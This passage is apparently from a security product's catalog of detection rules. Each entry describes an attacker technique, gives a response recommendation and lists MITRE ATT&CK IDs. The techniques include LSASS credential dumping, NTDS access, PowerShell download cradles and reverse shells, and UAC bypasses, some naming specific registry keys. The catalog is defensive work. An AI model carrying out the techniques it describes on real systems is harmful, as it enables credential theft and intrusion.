Using existing log data or forensics sources, determine what occurred when the logs were deleted. Analyse network appliance and Active Directory logs, and sources from the host, including the Master File Table or AMCache.

#### MITRE ATT&CK Techniques

- Indicator Removal on Host - T1070
- Clear Windows Event Logs - T1070.001


</details>



<details>
<summary>Attacker Technique - Minidump Used on LSASS</summary>



#### Description

This detection identifies the use of the ‘MiniDump’ command against the ‘lsass.exe’ process. This technique is used by malicious actors and penetration testers to read the memory contents of it and dump passwords and hashes.


#### Recommendation

Determine if this was part of authorized penetration testing. Other than testing, there is little, if any, reason for activity like this to occur legitimately. Quarantine the host immediately.

#### MITRE ATT&CK Techniques

- LSASS Memory - T1003.001


</details>



<details>
<summary>Attacker Technique - Minidump via COM Services DLL</summary>



#### Description

A malicious actor can use the MiniDump function of comsvcs.dll to create a dump of a process. Often the LSASS process will be targeted, as credentials can be extracted from the dump. This DLL may be run via the command line using RunDLL32.exe.

#### Recommendation

Determine if this was part of authorized penetration testing. Other than testing, there is little, if any, reason for activity like this to occur legitimately. Quarantine the host immediately.

#### MITRE ATT&CK Techniques

- LSASS Memory - T1003.001
- Rundll32 - T1218.011


</details>



<details>
<summary>Attacker Technique - Modification Of Files In Exchange Webroot</summary>



#### Description

This detection identifies moving or changing attributes of files within the webroot of Microsoft Exchange and Outlook Web Access. This technique is used by malicious actors to hide or make files inaccessible to programs and administrators.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Server Software Component - T1505
- Web Shell - T1505.003
- Hide Artifacts - T1564
- Hidden Files and Directories - T1564.001


</details>



<details>
<summary>Attacker Technique - MpCmdRun.exe Downloads File</summary>



#### Description

This detection identifies use of 'MpCmdRun.exe'. 'MpCmdRun.exe', the Microsoft Malware Protection command line, can be used to download files from external sources by passing it the -url and -path flags. A malicious actor could use this to download additional payloads in a way that may avoid detection. 

#### Recommendation

Investigate the file that was downloaded and the source from which it was downloaded. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Ingress Tool Transfer - T1105


</details>



<details>
<summary>Attacker Technique - MSHTA Running JavaScript</summary>



#### Description

This detection identifies ‘mshta.exe’ executing with JavaScript in the command line, which is a tactic commonly used by malicious actors to run malicious JavaScript. 

#### Recommendation

Review the JavaScript command that was executed. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- JavaScript - T1059.007
- Mshta - T1218.005


</details>



<details>
<summary>Attacker Technique - MSIExec loading object via HTTP</summary>



#### Description

This detection identifies MSIExec being used to load remote binaries. Malicious actors use this to download and execute malware.

#### Recommendation

Investigate the URL that MSIExec is connecting to. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Msiexec - T1218.007


</details>



<details>
<summary>Attacker Technique - MSTSC Spawned By Advanced IP Scanner</summary>



#### Description

This detection identifies the Microsoft Terminal Services Client, 'mstsc.exe',  being spawned by the Advanced IP Scanner tool. Malicious actors use this technique to scan for systems and connect to these systems via Remote Desktop Protocol (RDP). 

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Remote Desktop Protocol - T1021.001
- Active Scanning - T1595


</details>



<details>
<summary>Attacker Technique - Net Command Deleting Exchange Admin Group</summary>



#### Description

This detection identifies the Exchange Organization Administrators group being deleted using 'net.exe' or 'net1.exe'. This tactic was used in several Exchange server compromises where webshells were placed on the server. 

#### Recommendation

 Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Account Access Removal - T1531


</details>



<details>
<summary>Attacker Technique - NetSupport Remote Access Tool</summary>



#### Description

This detection identifies the legitimate NetSupport Remote Access Tool being executed outside of its normal install directory. Malicious actors use this technique to maintain access to a target hosts, post compromise.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Remote Access Software - T1219


</details>



<details>
<summary>Attacker Technique - NirCMDC Takes Screenshot</summary>



#### Description

This detection identifies ‘NirCMDC.exe’ being executed with flags to take a screenshot of the current display. Malicious actors use this technique to collect additional information post compromise.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Screen Capture - T1113


</details>



<details>
<summary>Attacker Technique - NTDS File Access</summary>



#### Description

This detection identifies the presence of ‘ntds.dit’ in the command line, which is the file name of the Active Directory database. Malicious actors and penetration testers use this technique to obtain copies of hashes and other information about an Active Directory domain, post compromise.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- OS Credential Dumping - T1003
- NTDS - T1003.003


</details>



<details>
<summary>Attacker Technique - OldCmp Executed</summary>



#### Description

This detection identifies use of a deprecated old Active Directory utility called OldCmp.exe. Malicious actors have been observed using this tool for recon purposes. 

#### Recommendation

Examine the parent process that spawned the process in question, and any process that it may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Domain Trust Discovery - T1482


</details>



<details>
<summary>Attacker Technique - Openssl Encryption executed by a Batch file</summary>



#### Description

This detection identifies Windows Batch files ('.bat') attempting to execute the 'openssl' tool to encrypt files. This technique is used by malicious actors on some Ransomware as a method of encrypting files.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Data Encrypted for Impact - T1486


</details>



<details>
<summary>Attacker Technique - Ping Command And URL Passed To CertUtil</summary>



#### Description

This detection identifies the ‘-ping’ argument and a URL being passed to ‘CertUtil.exe’. This technique is used by malicious actors and penetration testers to retrieve files from a remote location, then execute them.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Ingress Tool Transfer - T1105


</details>



<details>
<summary>Attacker Technique - Potential Process Hollowing To DLLHost</summary>



#### Description

This detection identifies the execution of 'dllhost.exe' without common arguments. This may occur as part of a technique known as process hollowing, used by attackers when spawning to a common windows process to remain hidden.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Process Injection - T1055
- Process Hollowing - T1055.012


</details>



<details>
<summary>Attacker Technique - PowerShell Backtick Obfuscation</summary>



#### Description

This detection identifies backtick '`' characters being passed in strings to 'powershell.exe'. This technique is used by malicious actors to perform basic obfuscation of scripts they are executing on the target system.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Command and Scripting Interpreter - T1059
- PowerShell - T1059.001


</details>



<details>
<summary>Attacker Technique - PowerShell Concatenation Obfuscation</summary>



#### Description

This detection identifies concatenated strings being passed to 'powershell.exe'. This technique is used by malicious actors to perform basic obfuscation of scripts they are executing on the target system.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Obfuscated Files or Information - T1027
- Command and Scripting Interpreter - T1059
- PowerShell - T1059.001


</details>



<details>
<summary>Attacker Technique - PowerShell Download Cradle</summary>



#### Description

This detection identifies the use of PowerShell to download and run a payload hosted on a remote system. This technique is used by malicious actors to stage fileless malware, such as Kovter. Kovter often uses JavaScript payloads and is typically preceded by the ‘MSHTA.exe’ execution.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Command and Scripting Interpreter - T1059
- PowerShell - T1059.001


</details>



<details>
<summary>Attacker Technique - PowerShell Download Cradles</summary>



#### Description

This detection identifies download cradles being passed to ‘PowerShell.exe’ in the command line. Download cradles include various methods malicious actors use to execute PowerShell to retrieve items from remote web and DNS servers. This technique is used by malicious actors  in malicious documents and interactively with target systems.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Command and Scripting Interpreter - T1059
- PowerShell - T1059.001
- Ingress Tool Transfer - T1105


</details>



<details>
<summary>Attacker Technique - PowerShell Get-ManagementRoleAssignment</summary>



#### Description

This detection identifies the presence of 'Get-ManagementRoleAssignment' in the command line. This PowerShell cmdlet is used by malicious actors in order to identify which roles have been assigned to which accounts.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Command and Scripting Interpreter - T1059
- PowerShell - T1059.001
- Account Discovery - T1087


</details>



<details>
<summary>Attacker Technique - PowerShell Get-WebServicesVirtualDirectory</summary>



#### Description

This detection identifies the presence of 'Get-WebServicesVirtualDirectory' in the command line. This PowerShell cmdlet is used by malicious actors in order to view Exchange Web Services (EWS) virtual directories that are used in Internet Information Services (IIS) on Microsoft Exchange servers.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Command and Scripting Interpreter - T1059
- PowerShell - T1059.001


</details>



<details>
<summary>Attacker Technique - PowerShell Invoke-WMIethod</summary>



#### Description

This detection identifies PowerShell using WMI to create a process by using the "Invoke-WmiMethod win32_process -name create" command.

#### Recommendation

Investigate the process that is being created. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.


#### MITRE ATT&CK Techniques

- Windows Management Instrumentation - T1047
- PowerShell - T1059.001


</details>



<details>
<summary>Attacker Technique - PowerShell MailboxExportRequest</summary>



#### Description

This detection identifies the presence of 'Get-MailboxExportRequest' or 'New-MailboxExportRequest' in the command line. This PowerShell cmdlet is used by malicious actors in order to remove evidence that would reveal export activity of a victims mailbox.


#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Command and Scripting Interpreter - T1059
- PowerShell - T1059.001
- Email Collection - T1114
- Local Email Collection - T1114.001


</details>



<details>
<summary>Attacker Technique - PowerShell Registry Cradle</summary>



#### Description

This detection identifies the use of PowerShell to read and run a script stored in the Windows Registry. This technique is used by malicious actors to maintain persistence for fileless malware.

#### Recommendation

Examine the parent process that spawned the process in question, and any process that it may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Command and Scripting Interpreter - T1059
- PowerShell - T1059.001
- Modify Registry - T1112


</details>



<details>
<summary>Attacker Technique - PowerShell Remove-MailboxExportRequest</summary>



#### Description

This detection identifies the presence of 'Remove-MailboxExportRequest' in the command line. This PowerShell cmdlet is used by malicious actors in order to remove evidence that would reveal export activity of a victims mailbox.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Command and Scripting Interpreter - T1059
- PowerShell - T1059.001
- Hide Artifacts - T1564


</details>



<details>
<summary>Attacker Technique - PowerShell Set-CASMailbox</summary>



#### Description

This detection identifies the presence of 'Set-CASMailbox' in the command line. This PowerShell cmdlet is used by malicious actors in order to grant themselves access to mailboxes of compromised victim accounts.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Command and Scripting Interpreter - T1059
- PowerShell - T1059.001
- Account Manipulation - T1098
- Exchange Email Delegate Permissions - T1098.002


</details>



<details>
<summary>Attacker Technique - Powershell Spawns Python.exe</summary>



#### Description

This detection identifies a Powershell command that spawns "Python.exe". Malicious actors use this technique to execute malicious python scripts.

#### Recommendation

Investigate the command that is being scheduled to run. Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Command and Scripting Interpreter - T1059
- Python - T1059.006


</details>



<details>
<summary>Attacker Technique - PowerShell [type] Obfuscation</summary>



#### Description

This detection identifies '[type]' being passed to 'powershell.exe' through the command line. This technique is used by malicious actors to obfuscate content of the scripts being executed on the target system.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Obfuscated Files or Information - T1027
- Command and Scripting Interpreter - T1059
- PowerShell - T1059.001


</details>



<details>
<summary>Attacker Technique - PowerShell UploadString</summary>



#### Description

This detection identifies the presence of the PowerShell System.NET ‘UploadString’ WebClient method in the command line. Malicious actors use this technique to upload data from compromised systems, post compromise.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Exfiltration Over C2 Channel - T1041


</details>



<details>
<summary>Attacker Technique - PowerShell Web Based Reverse Shell</summary>



#### Description

This detection identifies simple PowerShell based reverse shells that periodically make requests to a web server and execute the content of the response. Malicious actors use this technique  to communicate with their system from a compromised host to execute additional commands.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- PowerShell - T1059.001
- Web Protocols - T1071.001


</details>



<details>
<summary>Attacker Technique - PowerShell With DEADBEEF Environment Variable</summary>



#### Description

This detection identifies ‘PowerShell.exe’ being executed with an environment variable set with the name ‘DEADBEEF’. Malicious actors use this technique as a part of the payload retrieval process spawned by malicious documents.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Command and Scripting Interpreter - T1059
- PowerShell - T1059.001


</details>



<details>
<summary>Attacker Technique - Powershell With Split And Join Operators</summary>



#### Description

This detection identifies the ‘split’ and ‘join’ operators being passed to ‘PowerShell.exe’. Penetration testers and malicious actors use this technique to obfuscate the content of scripts.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Obfuscated Files or Information - T1027


</details>



<details>
<summary>Attacker Technique - ProcDump Output Filename For LSASS</summary>



#### Description

This detection identifies the use of the memory dumping utility ‘procdump.exe’ against the Local Security Authority Subsystem Service (LSASS), or ‘lsass.exe’ process. The default name of these files are ‘lsass.exe_YYMMDD_HHMMSS.dmp’ where ‘YYMMDD’ is the date and ‘HHMMSS’ is the time the file was generated. This technique is used by malicious actors and penetration testers to acquire the memory contents of the process and extract credentials from it with tools, such as Mimikatz.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- OS Credential Dumping - T1003
- LSASS Memory - T1003.001


</details>



<details>
<summary>Attacker Technique - ProcDump Used Against LSASS</summary>



#### Description

This detection identifies the use of the memory dumping utility ‘procdump.exe’ against the Local Security Authority Subsystem Service (LSASS), or ‘lsass.exe’ process. This technique is used by malicious actors and penetration testers to acquire the memory contents of the process and extract credentials from it with tools, such as Mimikatz.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- OS Credential Dumping - T1003
- LSASS Memory - T1003.001


</details>



<details>
<summary>Attacker Technique - Process Masquerading As IIS</summary>



#### Description

This detection identifies processes masquerading as the IIS process 'w3wp.exe', a Windows system binary. Malicious actors may use the name 'w3wp.exe' to disguise their own malicious binaries.

#### Recommendation

Examine the parent process that spawned the process in question, and any process that it may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Masquerading - T1036


</details>



<details>
<summary>Attacker Technique - Process Memory Dump with Rdrleakdiag.exe</summary>



#### Description

This detection identifies the 'rdrleakdiag.exe' utility being used to dump a process's memory. This may be used by malicious actors to dump the contents of LSASS or another process that may contain credentials. 

#### Recommendation

Examine the parent process that spawned the process in question, and anything that the process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- OS Credential Dumping - T1003
- LSASS Memory - T1003.001


</details>



<details>
<summary>Attacker Technique - Process Started From Windows Directory With Case Obfuscation</summary>



#### Description

This detection identifies processes being executed from the 'Windows' directory whose filenames have several changes between upper and lower case characters. This technique is often seen as a result of malicious actors or penetration testers using utilities, such as 'psexec.exe' to execute attacker tools on the remote system.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Indicator Removal from Tools - T1027.005


</details>



<details>
<summary>Attacker Technique - Query Windows System Policy Key</summary>



#### Description

This detection identifies ‘reg.exe’ being used to query the SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System registry key. This key contains information on whether or not a user will be prompted for Administrator credentials when requesting elevated permissions.


#### Recommendation

Investigate the user performing this activity, and the parent processes of ‘reg.exe’. Ensure that users are always prompted for credentials when attempting to elevate privileges.


#### MITRE ATT&CK Techniques

- Query Registry - T1012
- System Information Discovery - T1082


</details>



<details>
<summary>Attacker Technique - Reconnaissance Using ADExplorer</summary>



#### Description

This detection identifies ‘ADExplorer.exe’ being executed. System administrators, penetration testers, and malicious actors use this tool to gather information about an Active Directory environment, post compromise.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Remote System Discovery - T1018
- Permission Groups Discovery - T1069
- Local Groups - T1069.001
- Domain Groups - T1069.002


</details>



<details>
<summary>Attacker Technique - RegASM Executing Exe File</summary>



#### Description

This detection identifies ‘RegASM.exe’ being used to execute another binary. Penetration testers and malicious actors use this tool to proxy the execution of a malicious binary through a known, trusted binary.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Signed Binary Proxy Execution - T1218
- Regsvcs/Regasm - T1218.009


</details>



<details>
<summary>Attacker Technique - Reg.exe Disabling Local Security Authority (LSA) Protection</summary>



#### Description

This detection identifies the use of reg.exe to disable the Local Security Authority (LSA) protection. In Windows, the LSA manages user credentials and information that are stored in memory and if the LSA protection is enabled, the information being stored in memory is more secured. Attackers use this technique to disable  LSA protection so that they can eventually scrape unsecured user credentials and information.

#### Recommendation

Determine whether this is part of authorized administrator activity.  Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- OS Credential Dumping - T1003
- LSASS Memory - T1003.001
- Modify Registry - T1112


</details>



<details>
<summary>Attacker Technique - Reg.exe Setting Keys for fodhelper.exe UAC Bypass</summary>



#### Description

This detection identifies when key values in the Windows registry key ‘HKCU\Software\Classes\ms-settings\shell\open\command’ are set. When setting these key values, a malicious actor could cause arbitrary code to execute when fodhelper.exe is run,, which could allow a malicious actor to bypass the Microsoft Windows User Account Control prompt and inherit its elevated privileges.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.


#### MITRE ATT&CK Techniques

- Modify Registry - T1112
- Abuse Elevation Control Mechanism - T1548
- Bypass User Account Control - T1548.002


</details>



<details>
<summary>Attacker Technique - Reg.exe Setting Keys for sdclt.exe UAC Bypass</summary>



#### Description

This detection identifies when key values in the Windows registry key ‘HKCU\Software\Classes\Folder\shell\open\command’ are set. When setting these key values, a malicious actor could cause arbitrary code to execute when sdclt.exe is run. This could allow the malicious actor to bypass the Microsoft Windows User Account Control prompt, and inherit its elevated privileges.


#### Recommendation

Inspect the command that was added to the ‘HKCU\Software\Classes\Folder\shell\open\command’ and determine whether it is suspicious or benign activity. If necessary, rebuild the host from a known, good source and have the user change their password.


#### MITRE ATT&CK Techniques

- Modify Registry - T1112
- Bypass User Account Control - T1548.002


</details>



<details>
<summary>Attacker Technique - Regsvr32 Loads Object From Web Server</summary>



#### Description

This detection identifies URLs or ‘scrobj.dll’ being passed to the binary ‘regsvr32.exe’ to perform an application whitelisting bypass attack, called the ‘SquiblyDoo’ attack. This technique is used by malicious actors and penetration testers to execute code within dynamic link libraries through the ‘regsvr32.exe’ binary.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Signed Binary Proxy Execution - T1218
- Regsvr32 - T1218.010


</details>



<details>
<summary>Attacker Technique - Remote Access Via ScreenConnect</summary>



#### Description

This detection identifies the use of the legitimate remote access tool ScreenConnect. This technique is used by malicious actors to maintain persistence in a target environment, post compromise. 

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Remote Access Software - T1219


</details>



<details>
<summary>Attacker Technique - Remote Uninstallation of Software Using PsExec and MSIExec</summary>



#### Description

This detection identifies the uninstallation of software using 'msiexec.exe' with the flag of '/x' where the parent process is the legitimate remote command execution utility known as PSExec ('PSExeSVC.exe'). This technique has been observed in use by malicious actors in order to remove security monitoring software from the remote system.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password. 

#### MITRE ATT&CK Techniques

- Remote Services - T1021
- Signed Binary Proxy Execution - T1218
- Msiexec - T1218.007
- Impair Defenses - T1562
- Disable or Modify Tools - T1562.001
- System Services - T1569
- Service Execution - T1569.002


</details>



<details>
<summary>Attacker Technique - Renamed ADFind</summary>



#### Description

This detection identifies the 'ADFind.exe' utility being executed after it has been renamed. This technique is used by malicious actors to attempt to hide the execution of this utility for the purpose of performing reconnaissance against a target network post compromise.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Remote System Discovery - T1018
- Permission Groups Discovery - T1069
- Account Discovery - T1087
- Domain Trust Discovery - T1482


</details>



<details>
<summary>Attacker Technique - Renamed AVDump</summary>



#### Description

This detection identifies renamed versions of Avast Software's 'avdump32.exe' utility being executed. Malicious actors use this  legitimate security utility to execute malicious code since older versions of this utility allow DLL side loading.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Hijack Execution Flow - T1574
- DLL Side-Loading - T1574.002


</details>



<details>
<summary>Attacker Technique - Renamed mshta.exe</summary>



#### Description

This detection identifies renamed copies of the legitimate Windows binary ‘mshta.exe’. Malicious actors often use ‘mshta.exe’ to execute malicious code, and will sometimes bring their own renamed copy of ‘mshta.exe’ into the environment.

#### Recommendation

Inspect any commands or .HTA files that were executed by the renamed copy of MSHTA. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Masquerading - T1036
- Command and Scripting Interpreter - T1059
- Mshta - T1218.005


</details>



<details>
<summary>Attacker Technique - Renamed Or Non-Stardard Location For RClone</summary>



#### Description

This detection identifies the execution of the file copy utility known as 'rclone.exe' when it being executed from a non standard location or has been renamed. This technique is used by malicious actors in order to perform exfiltration of data to various cloud storage provides post compromise.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Exfiltration to Cloud Storage - T1567.002


</details>



<details>
<summary>Attacker Technique - Renamed ProcDump</summary>



#### Description

This detection identifies the use of renamed versions of ‘ProcDump.exe’ and ‘ProcDump64.exe’ from Microsoft's SysInternals Suite of utilities. This technique is used by malicious actors and penetration testers to dump the content of memory from specific processes, such as ‘lsass.exe’ to acquire credentials.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Masquerading - T1036
- Rename System Utilities - T1036.003


</details>



<details>
<summary>Attacker Technique - Rundll32.exe Executes Bazarloader Function</summary>



#### Description

This detection identifies the execution of 'rundll32.exe' to execute a dll using 'EnterDll' as a function. This technique is used by malicious actors, specifically the Bazarloader malware, to perform process injection and execute malicious DLLs.

#### Recommendation

Examine the parent process that spawned the process in question. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Process Injection - T1055
- Signed Binary Proxy Execution - T1218
- Rundll32 - T1218.011


</details>



<details>
<summary>Attacker Technique - Rundll32.exe Executes CobaltStrike Function Name</summary>



#### Description

This detection identifies the execution of the ‘start’ or 'TstSec' function in a ‘.dll’ file being passed to ‘rundll32.exe’. This technique is default behavior in various tools, such as CobaltStrike, which are used by malicious actors and penetration testers to proxy the execution of malicious code through a known, trusted binary.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Rundll32 - T1218.011


</details>



<details>
<summary>Attacker Technique - Running renamed DLL file with the DllRegisterServer function</summary>



#### Description

This detection identifies the execution of a non-standard named DLL file with the call to the function named "DllRegisterServer" via the command line. This technique is used by malicious actors and has been seen being used on most Emotet malware campaigns.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Exploitation for Defense Evasion - T1211
- Impair Defenses - T1562


</details>



<details>
<summary>Attacker Technique - sdclt.exe /KickOffElev UAC Bypass</summary>



#### Description

This detection identifies a possible UAC bypass using 'sdclt.exe'. In some versions of Windows, an attacker can modify the registry key HKCU\Software\Classes\exefile\shell\runas\command\IsolatedCommand to point to a command of their choosing. When the attacker runs 'sdclt.exe /KickOffElev', the command in the registry key will be run with elevated privileges.

#### Recommendation

Examine the parent process that spawned the command, and anything else that process may have spawned. If this activity is not benign or expected, consider rebuilding the host from a known, good source and having the user change their password.

#### MITRE ATT&CK Techniques

- Modify Registry - T1112
- Bypass User Account Control - T1548.002


</details>



<details>
<summary>Attacker Technique - Searching For Passwords With Findstr</summary>



#### Description

This detection identifies 'findstr.exe' being used to search for 'password'. This technique is used by malicious actors to find cleartext credentials.

#### Recommendation

Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

</details>



<details>
<summary>Attacker Technique - Set Debugger for Accessibility Process</summary>



#### Description

This detection identifies an accessibility program having its debugger set via command line. By setting the debugger for accessibility processes that are accessible from a lock screen (sethc.exe, utilman.exe, osk.exe, magnify.exe, narrator.exe, displayswitch.exe, and atbroker.exe), a malicious actor can cause that process to spawn another process whenever it runs. Usually this will be cmd.exe so that the actor can access a command shell without having to log into the system.

#### Recommendation

Determine whether the activity is part of legitimate debugging or accessibility feature activity. If necessary, rebuild the host from a known, good source and have the user change their password.


#### MITRE ATT&CK Techniques

- Accessibility Features - T1546.008


</details>



<details>
<summary>Attacker Technique - Setting %COMSPEC% Variable</summary>



#### Description

This detection identifies the %COMSPEC% environment variable being changed via the command line. %COMSPEC% points to the system's default command line interpreter. By changing %COMSPEC%, a malicious actor can cause something of their choosing to be executed rather than the default shell.

#### Recommendation

Inspect the command or file that %COMSPEC% has been set to point to. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Command and Scripting Interpreter - T1059


</details>



<details>
<summary>Attacker Technique - SpoolSV Spawns CMD or PowerShell</summary>



#### Description

This detection identifies ‘spoolsv.exe’ spawning ‘cmd.exe’ or ‘PowerShell.exe’. This technique is used by various remote code execution tools that are used by malicious actors which will often target spoolsv.exe for process injection, or by remote code execution exploits such as CVE-2021-1675 if they are spawning a cmd.exe or PowerShell instance for the actor. 

#### Recommendation

Investigate the arguments of the PowerShell or Cmd.exe process being executed. Determine if the process being launched is expected or otherwise benign behavior. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Process Injection - T1055
- Exploitation of Remote Services - T1210


</details>



<details>
<summary>Attacker Technique - Stop Windows Defender</summary>



#### Description

This detection identifies the use of suspicious process arguments for the Windows program’s ‘cmd.exe’ or ‘PowerShell.exe’, which could be used by malicious actors to issue Service Control commands to stop or delete the Windows Defender Service. Rapid7 has observed malicious actors disabling Windows Defender during process events for some malware variants.

#### Recommendation

Investigate the process execution history on the host in question to determine the root cause of the suspicious command invocation. If malware is identified during the investigation process, isolate the system and restore it from a validated known, good baseline image.

#### MITRE ATT&CK Techniques

- Impair Defenses - T1562
- Disable or Modify Tools - T1562.001


</details>



<details>
<summary>Attacker Technique - UAC Bypass Using DISMHost</summary>



#### Description

This detection identifies the use of the Windows system binary ‘DISMhost.exe’, which will automatically run with elevated privileges. This binary searches in a user-writable location for a DLL to load. A malicious actor could use this binary to bypass the Microsoft Windows User Account Control prompt and inherit its elevated privileges.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Abuse Elevation Control Mechanism - T1548
- Bypass User Account Control - T1548.002


</details>



<details>
<summary>Attacker Technique - UAC Bypass Using SCDLT</summary>



#### Description

This detection identifies the use of the Windows system binary ‘SDCLT.exe’, which will automatically run with elevated privileges. By setting the value of the ‘HKCU:\Software\Classes\ms-settings\shell\open\command\DelegateExecute’ registry key, a malicious actor could cause additional code to run with ‘SDCLT.exe’ that will inherit its elevated privileges.

#### Recommendation

Review the alert in question. If necessary, rebuild the host from a known, good source and have the user change their password.

#### MITRE ATT&CK Techniques

- Abuse Elevation Control Mechanism - T1548
- Bypass User Account Control - T1548.002


</details>



<details>
<summary>Attacker Technique - UAC Bypass Using SndVol</summary>



#### Description

